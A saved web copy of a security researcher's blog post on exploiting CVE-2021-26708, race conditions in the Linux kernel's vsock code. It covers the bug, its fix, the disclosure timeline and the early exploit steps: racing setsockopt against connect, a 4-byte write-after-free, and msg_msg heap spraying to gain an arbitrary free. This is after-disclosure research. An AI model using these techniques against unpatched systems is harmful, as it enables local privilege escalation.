<!DOCTYPE html>
<!-- saved from url=(0058)https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <link rel="apple-touch-icon" sizes="180x180" href="https://a13xp0p0v.github.io/img/favicons/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="https://a13xp0p0v.github.io/img/favicons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://a13xp0p0v.github.io/img/favicons/favicon-16x16.png">
  <link rel="manifest" href="https://a13xp0p0v.github.io/img/favicons/site.webmanifest">
  <link rel="shortcut icon" href="https://a13xp0p0v.github.io/img/favicons/favicon.ico">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="msapplication-config" content="/img/favicons/browserconfig.xml">
  <meta name="theme-color" content="#ffffff">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel | Alexander Popov</title>
<meta name="generator" content="Jekyll v3.9.0">
<meta property="og:title" content="Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel">
<meta property="og:locale" content="en_US">
<meta name="description" content="CVE-2021-26708 is assigned to five race condition bugs in the virtual socket implementation of the Linux kernel. I discovered and fixed them in January 2021. In this article I describe how to exploit them for local privilege escalation on Fedora 33 Server for x86_64, bypassing SMEP and SMAP.">
<meta property="og:description" content="CVE-2021-26708 is assigned to five race condition bugs in the virtual socket implementation of the Linux kernel. I discovered and fixed them in January 2021. In this article I describe how to exploit them for local privilege escalation on Fedora 33 Server for x86_64, bypassing SMEP and SMAP.">
<link rel="canonical" href="https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html">
<meta property="og:url" content="https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html">
<meta property="og:site_name" content="Alexander Popov">
<meta property="og:image" content="https://a13xp0p0v.github.io/img/ava_bg.jpg">
<meta property="og:type" content="article">
<meta property="article:published_time" content="2021-02-09T07:30:00+00:00">
<meta name="twitter:card" content="summary">
<meta property="twitter:image" content="https://a13xp0p0v.github.io/img/ava_bg.jpg">
<meta property="twitter:title" content="Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel">
<meta name="twitter:site" content="@a13xp0p0v">
<script type="application/ld+json">
{"headline":"Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel","dateModified":"2021-02-09T07:30:00+00:00","description":"CVE-2021-26708 is assigned to five race condition bugs in the virtual socket implementation of the Linux kernel. I discovered and fixed them in January 2021. In this article I describe how to exploit them for local privilege escalation on Fedora 33 Server for x86_64, bypassing SMEP and SMAP.","datePublished":"2021-02-09T07:30:00+00:00","url":"https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html","@type":"BlogPosting","image":"https://a13xp0p0v.github.io/img/ava_bg.jpg","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://a13xp0p0v.github.io/img/ava_bg.jpg"}},"mainEntityOfPage":{"@type":"WebPage","@id":"https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="./2021 - Four Bytes of Power exploiting CVE-2021-26708 in the Linux kernel_files/main.css"><link type="application/atom+xml" rel="alternate" href="https://a13xp0p0v.github.io/feed.xml" title="Alexander Popov"></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="https://a13xp0p0v.github.io/"><img id="logo" src="./2021 - Four Bytes of Power exploiting CVE-2021-26708 in the Linux kernel_files/a13xp0p0v_ava.png" height="60px"> Alexander Popov</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger">
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="https://a13xp0p0v.github.io/about/">About</a><a class="page-link" href="https://a13xp0p0v.github.io/articles/">Articles</a><a class="page-link" href="https://a13xp0p0v.github.io/conference_talks/">Conference Talks</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2021-02-09T07:30:00+00:00" itemprop="datePublished">Feb 9, 2021
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>CVE-2021-26708 is assigned to five race condition bugs in the virtual socket implementation of the Linux kernel. I discovered and fixed them in January 2021. In this article I describe how to exploit them for local privilege escalation on Fedora 33 Server for x86_64, bypassing SMEP and SMAP.</p>

<p>Today I gave <a href="http://zer0con.org/#speaker-section">a talk at Zer0Con 2021</a> on this topic (<a href="https://a13xp0p0v.github.io/img/CVE-2021-26708.pdf">slides</a>).</p>

<p>I like this exploit. The race condition can be leveraged for very limited memory corruption, which I gradually turn into arbitrary read/write of kernel memory, and ultimately full power over the system. That's why I titled this article "Four Bytes of Power."</p>

<p>Now the PoC demo <a href="https://youtu.be/EC8PFOYOUgU">video</a>:</p>
<div style="position:relative;padding-top:56.25%;">
  <iframe src="./2021 - Four Bytes of Power exploiting CVE-2021-26708 in the Linux kernel_files/EC8PFOYOUgU.html" frameborder="0" allowfullscreen="" style="position:absolute;top:0;left:0;width:100%;height:100%;"></iframe>
</div>
<p><br></p>

<h2 id="vulnerabilities">Vulnerabilities</h2>

<p>These vulnerabilities are race conditions caused by faulty locking in <a href="https://elixir.bootlin.com/linux/v5.10/source/net/vmw_vsock/af_vsock.c"><code class="language-plaintext highlighter-rouge">net/vmw_vsock/af_vsock.c</code></a>. The race conditions were implicitly introduced in November 2019 in the commits that added <code class="language-plaintext highlighter-rouge">VSOCK</code> multi-transport support. These commits were merged into Linux kernel version <code class="language-plaintext highlighter-rouge">5.5-rc1</code>.</p>

<p><code class="language-plaintext highlighter-rouge">CONFIG_VSOCKETS</code> and <code class="language-plaintext highlighter-rouge">CONFIG_VIRTIO_VSOCKETS</code> are shipped as kernel modules in all major GNU/Linux distributions. The vulnerable modules are automatically loaded when you create a socket for the <code class="language-plaintext highlighter-rouge">AF_VSOCK</code> domain:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">vsock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_VSOCK</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">AF_VSOCK</code>&nbsp;socket creation is available to unprivileged users without requiring user namespaces. Neat, right?</p>

<h2 id="bugs-and-fixes">Bugs and fixes</h2>

<p>I use the <a href="https://github.com/google/syzkaller/">syzkaller fuzzer</a> with custom modifications. On January 11, I saw that it got a suspicious kernel crash in <a href="https://elixir.bootlin.com/linux/v5.10/source/net/vmw_vsock/virtio_transport_common.c#L490"><code class="language-plaintext highlighter-rouge">virtio_transport_notify_buffer_size()</code></a>. However, the fuzzer didn't manage to reproduce this crash, so I started inspecting the source code and developing the reproducer manually.</p>

<p>A few days later I found a confusing bug in <code class="language-plaintext highlighter-rouge">vsock_stream_setsockopt()</code> that looked intentional:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">sk</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">vsock_sock</span> <span class="o">*</span><span class="n">vsk</span><span class="p">;</span>
    <span class="k">const</span> <span class="k">struct</span> <span class="n">vsock_transport</span> <span class="o">*</span><span class="n">transport</span><span class="p">;</span>

    <span class="cm">/* ... */</span>

    <span class="n">sk</span> <span class="o">=</span> <span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">;</span>
    <span class="n">vsk</span> <span class="o">=</span> <span class="n">vsock_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>
    <span class="n">transport</span> <span class="o">=</span> <span class="n">vsk</span><span class="o">-&gt;</span><span class="n">transport</span><span class="p">;</span>

    <span class="n">lock_sock</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>
</code></pre></div></div>

<p>That's strange. The pointer to the virtual socket transport is copied to a local variable <strong>before</strong> the <code class="language-plaintext highlighter-rouge">lock_sock()</code> call. But the <code class="language-plaintext highlighter-rouge">vsk-&gt;transport</code> value may change when the socket lock is not acquired! That is an obvious race condition bug. I checked the whole <code class="language-plaintext highlighter-rouge">af_vsock.c</code> file and found four more similar issues.</p>

<p>Searching the git history helped to understand the reason. Initially, the transport for a virtual socket was not able to change, so copying the value of <code class="language-plaintext highlighter-rouge">vsk-&gt;transport</code> to a local variable was safe. Later, the bugs were implicitly introduced by commit <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=c0cfa2d8a788fcf45df5bf4070ab2474c88d543a"><code class="language-plaintext highlighter-rouge">c0cfa2d8a788fcf4</code></a> (<em>vsock: add multi-transports support</em>) and commit <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6a2c0962105ae8ceba182c4f616e0e41d7755591"><code class="language-plaintext highlighter-rouge">6a2c0962105ae8ce</code></a> (<em>vsock: prevent transport modules unloading</em>).</p>

<p>Fixing this vulnerability is trivial:</p>

<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 	sk = sock-&gt;sk;
 	vsk = vsock_sk(sk);
<span class="gd">-	transport = vsk-&gt;transport;
</span> 
 	lock_sock(sk);
 
<span class="gi">+	transport = vsk-&gt;transport;
</span></code></pre></div></div>

<h2 id="a-bit-odd-vulnerability-disclosure">A bit odd vulnerability disclosure</h2>

<p>On January 30, after finishing the PoC exploit, I created the fixing patch and made responsible disclosure to <code class="language-plaintext highlighter-rouge">security@kernel.org</code>. I got very prompt replies from Linus and Greg, and we settled on this procedure:</p>

<ol>
  <li>Sending my patch to the Linux Kernel Mailing List (LKML) in public.</li>
  <li>Merging it upstream and backporting to affected stable trees.</li>
  <li>Informing distributions about the security relevance of this issue via the <code class="language-plaintext highlighter-rouge">linux-distros</code> mailing list.</li>
  <li>Making disclosure via <code class="language-plaintext highlighter-rouge">oss-security@lists.openwall.com</code>, when allowed by the distributions.</li>
</ol>

<p>The first step is questionable. Linus decided to merge my patch right away without any disclosure embargo because the patch "doesn't look all that different from the kinds of patches we do every day." I obeyed and proposed sending it to the LKML in public. Doing so is important because <a href="https://arxiv.org/abs/2009.01694">anybody can find kernel vulnerability fixes</a> by filtering kernel commits that didn't appear on the mailing lists.</p>

<p>On February 2, the second version of my patch was merged into <code class="language-plaintext highlighter-rouge">netdev/net.git</code> and then <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=c518adafa39f37858697ac9309c6cf1805581446">came to Linus' tree</a>. On February 4, Greg applied it to the affected stable trees. Then I immediately informed <code class="language-plaintext highlighter-rouge">linux-distros@vs.openwall.org</code> that the fixed bugs are exploitable and asked how much time the Linux distributions would need before I did public disclosure.</p>

<p>But I got the following reply:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    If the patch is committed upstream, then the issue is public.

    Please send to oss-security immediately.
</code></pre></div></div>

<p>A bit odd. Anyway, I then requested a CVE ID at <a href="https://cve.mitre.org/cve/request_id.html">https://cve.mitre.org/cve/request_id.html</a> and <a href="https://seclists.org/oss-sec/2021/q1/107">made the announcement</a> at <code class="language-plaintext highlighter-rouge">oss-security@lists.openwall.com</code>.</p>

<p>This raises the question: <strong>is this "merge ASAP" procedure compatible with the <code class="language-plaintext highlighter-rouge">linux-distros</code> mailing list?</strong></p>

<p>As a counter-example, when I reported <a href="https://a13xp0p0v.github.io/2017/03/24/CVE-2017-2636.html">CVE-2017-2636</a> to <code class="language-plaintext highlighter-rouge">security@kernel.org</code>, Kees Cook and Greg organized a one-week disclosure embargo via the <code class="language-plaintext highlighter-rouge">linux-distros</code> mailing list. That allowed Linux distributions to integrate my fix into their security updates in no rush and release them simultaneously.</p>

<h2 id="memory-corruption">Memory corruption</h2>

<p>Now let's focus on exploiting <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-26708">CVE-2021-26708</a>. I exploited the race condition in <code class="language-plaintext highlighter-rouge">vsock_stream_setsockopt()</code>. Reproducing it requires two threads. The first one calls <code class="language-plaintext highlighter-rouge">setsockopt()</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">setsockopt</span><span class="p">(</span><span class="n">vsock</span><span class="p">,</span> <span class="n">PF_VSOCK</span><span class="p">,</span> <span class="n">SO_VM_SOCKETS_BUFFER_SIZE</span><span class="p">,</span>
				<span class="o">&amp;</span><span class="n">size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">));</span>
</code></pre></div></div>

<p>The second thread should change the virtual socket transport while <code class="language-plaintext highlighter-rouge">vsock_stream_setsockopt()</code> is trying to acquire the socket lock. It is performed by reconnecting to the virtual socket:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">struct</span> <span class="n">sockaddr_vm</span> <span class="n">addr</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">svm_family</span> <span class="o">=</span> <span class="n">AF_VSOCK</span><span class="p">,</span>
    <span class="p">};</span>

    <span class="n">addr</span><span class="p">.</span><span class="n">svm_cid</span> <span class="o">=</span> <span class="n">VMADDR_CID_LOCAL</span><span class="p">;</span>
    <span class="n">connect</span><span class="p">(</span><span class="n">vsock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_vm</span><span class="p">));</span>

    <span class="n">addr</span><span class="p">.</span><span class="n">svm_cid</span> <span class="o">=</span> <span class="n">VMADDR_CID_HYPERVISOR</span><span class="p">;</span>
    <span class="n">connect</span><span class="p">(</span><span class="n">vsock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_vm</span><span class="p">));</span>
</code></pre></div></div>

<p>To handle <code class="language-plaintext highlighter-rouge">connect()</code> for a virtual socket, the kernel executes <code class="language-plaintext highlighter-rouge">vsock_stream_connect()</code>, which calls <code class="language-plaintext highlighter-rouge">vsock_assign_transport()</code>. This function has some code we are interested in:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span> <span class="p">(</span><span class="n">vsk</span><span class="o">-&gt;</span><span class="n">transport</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">vsk</span><span class="o">-&gt;</span><span class="n">transport</span> <span class="o">==</span> <span class="n">new_transport</span><span class="p">)</span>
            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

        <span class="cm">/* transport-&gt;release() must be called with sock lock acquired.
         * This path can only be taken during vsock_stream_connect(),
         * where we have already held the sock lock.
         * In the other cases, this function is called on a new socket
         * which is not assigned to any transport.
         */</span>
        <span class="n">vsk</span><span class="o">-&gt;</span><span class="n">transport</span><span class="o">-&gt;</span><span class="n">release</span><span class="p">(</span><span class="n">vsk</span><span class="p">);</span>
        <span class="n">vsock_deassign_transport</span><span class="p">(</span><span class="n">vsk</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>Note that <code class="language-plaintext highlighter-rouge">vsock_stream_connect()</code> holds the socket lock. Meanwhile, <code class="language-plaintext highlighter-rouge">vsock_stream_setsockopt()</code> in a parallel thread is trying to acquire it. Good. This is what we need for hitting the race condition.</p>

<p>So, on the second <code class="language-plaintext highlighter-rouge">connect()</code> with a different <code class="language-plaintext highlighter-rouge">svm_cid</code>, the <code class="language-plaintext highlighter-rouge">vsock_deassign_transport()</code> function is called. The function executes the transport destructor <code class="language-plaintext highlighter-rouge">virtio_transport_destruct()</code> and thus frees <code class="language-plaintext highlighter-rouge">vsock_sock.trans</code>. At this point, you might guess that use-after-free is where all this is heading :) <code class="language-plaintext highlighter-rouge">vsk-&gt;transport</code> is set to NULL.</p>

<p>When <code class="language-plaintext highlighter-rouge">vsock_stream_connect()</code> releases the socket lock, <code class="language-plaintext highlighter-rouge">vsock_stream_setsockopt()</code> can proceed with execution. It calls <code class="language-plaintext highlighter-rouge">vsock_update_buffer_size()</code>, which subsequently calls <code class="language-plaintext highlighter-rouge">transport-&gt;notify_buffer_size()</code>. Here <code class="language-plaintext highlighter-rouge">transport</code> has an <strong>out-of-date value from a local variable</strong> that doesn't match <code class="language-plaintext highlighter-rouge">vsk-&gt;transport</code> (which is NULL).</p>

<p>The kernel executes <code class="language-plaintext highlighter-rouge">virtio_transport_notify_buffer_size()</code>, corrupting kernel memory:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">virtio_transport_notify_buffer_size</span><span class="p">(</span><span class="k">struct</span> <span class="n">vsock_sock</span> <span class="o">*</span><span class="n">vsk</span><span class="p">,</span> <span class="n">u64</span> <span class="o">*</span><span class="n">val</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">virtio_vsock_sock</span> <span class="o">*</span><span class="n">vvs</span> <span class="o">=</span> <span class="n">vsk</span><span class="o">-&gt;</span><span class="n">trans</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">val</span> <span class="o">&gt;</span> <span class="n">VIRTIO_VSOCK_MAX_BUF_SIZE</span><span class="p">)</span>
        <span class="o">*</span><span class="n">val</span> <span class="o">=</span> <span class="n">VIRTIO_VSOCK_MAX_BUF_SIZE</span><span class="p">;</span>

    <span class="n">vvs</span><span class="o">-&gt;</span><span class="n">buf_alloc</span> <span class="o">=</span> <span class="o">*</span><span class="n">val</span><span class="p">;</span>

    <span class="n">virtio_transport_send_credit_update</span><span class="p">(</span><span class="n">vsk</span><span class="p">,</span> <span class="n">VIRTIO_VSOCK_TYPE_STREAM</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Here <code class="language-plaintext highlighter-rouge">vvs</code> is a pointer to kernel memory that has been freed in <code class="language-plaintext highlighter-rouge">virtio_transport_destruct()</code>. The size of <code class="language-plaintext highlighter-rouge">struct virtio_vsock_sock</code> is 64 bytes; this object lives in the <code class="language-plaintext highlighter-rouge">kmalloc-64</code> slab cache. The <code class="language-plaintext highlighter-rouge">buf_alloc</code> field has type <code class="language-plaintext highlighter-rouge">u32</code> and resides at offset 40. <code class="language-plaintext highlighter-rouge">VIRTIO_VSOCK_MAX_BUF_SIZE</code> is <code class="language-plaintext highlighter-rouge">0xFFFFFFFFUL</code>. The value <code class="language-plaintext highlighter-rouge">*val</code> is controlled by the attacker, and the four least significant bytes of it are written to the freed memory.</p>

<h2 id="fuzzing-miracle">"Fuzzing miracle"</h2>

<p>As I mentioned, syzkaller didn't manage to reproduce this crash, and I had to develop the reproducer manually. But why did the fuzzer fail? Looking at <code class="language-plaintext highlighter-rouge">vsock_update_buffer_size()</code> gave the answer:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span> <span class="p">(</span><span class="n">val</span> <span class="o">!=</span> <span class="n">vsk</span><span class="o">-&gt;</span><span class="n">buffer_size</span> <span class="o">&amp;&amp;</span>
      <span class="n">transport</span> <span class="o">&amp;&amp;</span> <span class="n">transport</span><span class="o">-&gt;</span><span class="n">notify_buffer_size</span><span class="p">)</span>
        <span class="n">transport</span><span class="o">-&gt;</span><span class="n">notify_buffer_size</span><span class="p">(</span><span class="n">vsk</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">val</span><span class="p">);</span>

    <span class="n">vsk</span><span class="o">-&gt;</span><span class="n">buffer_size</span> <span class="o">=</span> <span class="n">val</span><span class="p">;</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">notify_buffer_size()</code> handler is called only if <code class="language-plaintext highlighter-rouge">val</code> differs from the current <code class="language-plaintext highlighter-rouge">buffer_size</code>. In other words, <code class="language-plaintext highlighter-rouge">setsockopt()</code> performing <code class="language-plaintext highlighter-rouge">SO_VM_SOCKETS_BUFFER_SIZE</code> should be called with different <code class="language-plaintext highlighter-rouge">size</code> parameters each time. I used this fun hack to hit the memory corruption in my first reproducer (<a href="https://a13xp0p0v.github.io/img/vsock_racer.c">source code</a>):</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">struct</span> <span class="n">timespec</span> <span class="n">tp</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">clock_gettime</span><span class="p">(</span><span class="n">CLOCK_MONOTONIC</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tp</span><span class="p">);</span>
    <span class="n">size</span> <span class="o">=</span> <span class="n">tp</span><span class="p">.</span><span class="n">tv_nsec</span><span class="p">;</span>
    <span class="n">setsockopt</span><span class="p">(</span><span class="n">vsock</span><span class="p">,</span> <span class="n">PF_VSOCK</span><span class="p">,</span> <span class="n">SO_VM_SOCKETS_BUFFER_SIZE</span><span class="p">,</span>
				<span class="o">&amp;</span><span class="n">size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">));</span>
</code></pre></div></div>

<p>Here, the <code class="language-plaintext highlighter-rouge">size</code> value is taken from the nanoseconds count returned by <code class="language-plaintext highlighter-rouge">clock_gettime()</code>, and it is likely to be different on each racing round. Upstream <code class="language-plaintext highlighter-rouge">syzkaller</code> without modifications doesn't do things like that. The values of syscall parameters are chosen when <code class="language-plaintext highlighter-rouge">syzkaller</code> generates the fuzzing input. They don't change when the fuzzer executes it on the target.</p>

<p>Anyway, I still don't completely understand how <code class="language-plaintext highlighter-rouge">syzkaller</code> managed to hit this crash <code class="language-plaintext highlighter-rouge">¯\_(ツ)_/¯</code> It looks like the fuzzer did some lucky multithreaded magic with <code class="language-plaintext highlighter-rouge">SO_VM_SOCKETS_BUFFER_MAX_SIZE</code> and <code class="language-plaintext highlighter-rouge">SO_VM_SOCKETS_BUFFER_MIN_SIZE</code> but then failed to reproduce it.</p>

<p><strong>Idea!</strong> Maybe adding the ability to randomize some syscall arguments at runtime would allow <code class="language-plaintext highlighter-rouge">syzkaller</code> to spot more bugs like <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-26708">CVE-2021-26708</a>. On the other hand, doing so could also make crash reproduction less stable.</p>

<h2 id="four-bytes-of-power">Four bytes of power</h2>

<p>This time I chose Fedora 33 Server as the exploitation target, with kernel version <code class="language-plaintext highlighter-rouge">5.10.11-200.fc33.x86_64</code>. From the beginning, I was determined to bypass SMEP and SMAP.</p>

<p>To sum up, <strong>this race condition may cause write-after-free of a 4-byte controlled value to a 64-byte kernel object at offset 40.</strong> That's quite limited memory corruption. I had a hard time turning it into a real weapon. I'm going to describe the exploit based on its development timeline.</p>

<center><img src="./2021 - Four Bytes of Power exploiting CVE-2021-26708 in the Linux kernel_files/fork_weapon.jpg" width="75%"></center>

<p><em>The photos come from artifacts in the collection of Russia's <a href="https://www.hermitagemuseum.org/wps/portal/hermitage?lng=en">State Hermitage Museum</a>. I love this wonderful museum!</em></p>

<p>As a first step, I started to work on stable <a href="https://en.wikipedia.org/wiki/Heap_spraying">heap spraying</a>. The exploit should perform some userspace activity that makes the kernel allocate another 64-byte object at the location of the freed <code class="language-plaintext highlighter-rouge">virtio_vsock_sock</code>. That way, 4-byte write-after-free should corrupt the sprayed object (instead of unused free kernel memory).</p>

<p>I set up some quick experimental spraying with the <code class="language-plaintext highlighter-rouge">add_key</code> syscall. I called it several times right after the second <code class="language-plaintext highlighter-rouge">connect()</code> to the virtual socket, while a parallel thread finishes the vulnerable <code class="language-plaintext highlighter-rouge">vsock_stream_setsockopt()</code>. Tracing the kernel allocator with <code class="language-plaintext highlighter-rouge">ftrace</code> allowed confirming that the freed <code class="language-plaintext highlighter-rouge">virtio_vsock_sock</code> is overwritten. In other words, I saw that successful heap spraying was possible.</p>

<p>The next step in my exploitation strategy was to find a 64-byte kernel object that can provide a stronger <a href="https://googleprojectzero.blogspot.com/2020/06/a-survey-of-recent-ios-kernel-exploits.html">exploit primitive</a> when it has four corrupted bytes at offset 40. Huh… not so easy!</p>

<p>My first thought was to employ the <code class="language-plaintext highlighter-rouge">iovec</code> technique from the <a href="https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html">Bad Binder exploit</a> by Maddie Stone and Jann Horn. The essence of it is to use a carefully corrupted <code class="language-plaintext highlighter-rouge">iovec</code> object for arbitrary read/write of kernel memory. However, I got a triple fail with this idea:</p>

<ol>
  <li>64-byte iovec is allocated on the kernel stack, not the heap.</li>
  <li>Four bytes at offset 40 overwrite <code class="language-plaintext highlighter-rouge">iovec.iov_len</code> (not <code class="language-plaintext highlighter-rouge">iovec.iov_base</code>), so the original approach can't work.</li>
  <li>This <code class="language-plaintext highlighter-rouge">iovec</code> exploitation trick has been dead since Linux kernel version <code class="language-plaintext highlighter-rouge">4.13</code>. Awesome Al Viro killed it with commit <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=09fc68dc66f7597bdc8898c991609a48f061bed5">09fc68dc66f7597b</a> back in June 2017:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>we have *NOT* done access_ok() recently enough; we rely upon the
iovec array having passed sanity checks back when it had been created
and not nothing having buggered it since.  However, that's very much
non-local, so we'd better recheck that.
</code></pre></div>    </div>
  </li>
</ol>

<p>After exhausting experiments with a handful of other kernel objects suitable for heap spraying, I found the <a href="https://man7.org/linux/man-pages/man2/msgsnd.2.html"><code class="language-plaintext highlighter-rouge">msgsnd()</code></a> syscall. It creates <code class="language-plaintext highlighter-rouge">struct msg_msg</code> in the kernelspace, see the <code class="language-plaintext highlighter-rouge">pahole</code> output:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>struct msg_msg {
	struct list_head           m_list;               /*     0    16 */
	long int                   m_type;               /*    16     8 */
	size_t                     m_ts;                 /*    24     8 */
	struct msg_msgseg *        next;                 /*    32     8 */
	void *                     security;             /*    40     8 */

	/* size: 48, cachelines: 1, members: 5 */
	/* last cacheline: 48 bytes */
};
</code></pre></div></div>

<p>That is the message header, which is followed by message data. If <code class="language-plaintext highlighter-rouge">struct msgbuf</code> in the userspace has a 16-byte <code class="language-plaintext highlighter-rouge">mtext</code>, the corresponding <code class="language-plaintext highlighter-rouge">msg_msg</code> is created in the <code class="language-plaintext highlighter-rouge">kmalloc-64</code> slab cache, just like <code class="language-plaintext highlighter-rouge">struct virtio_vsock_sock</code>. The 4-byte write-after-free can corrupt the <code class="language-plaintext highlighter-rouge">void *security</code> pointer at offset 40. Using the <code class="language-plaintext highlighter-rouge">security</code> field to break Linux security: irony itself!</p>

<p>The <code class="language-plaintext highlighter-rouge">msg_msg.security</code> field points to the kernel data allocated by <code class="language-plaintext highlighter-rouge">lsm_msg_msg_alloc()</code> and used by SELinux in the case of Fedora. It is freed by <code class="language-plaintext highlighter-rouge">security_msg_msg_free()</code> when <code class="language-plaintext highlighter-rouge">msg_msg</code> is received. Hence corrupting the first half of the <code class="language-plaintext highlighter-rouge">security</code> pointer (least significant bytes on little-endian <code class="language-plaintext highlighter-rouge">x86_64</code>) provides <strong>arbitrary free</strong>, which is a much stronger exploit primitive.</p>

<center><img src="./2021 - Four Bytes of Power exploiting CVE-2021-26708 in the Linux kernel_files/crossbow_weapon.jpg" width="75%"></center>
<p><br></p>

<h2 id="kernel-infoleak-as-a-bonus">Kernel infoleak as a bonus</h2>

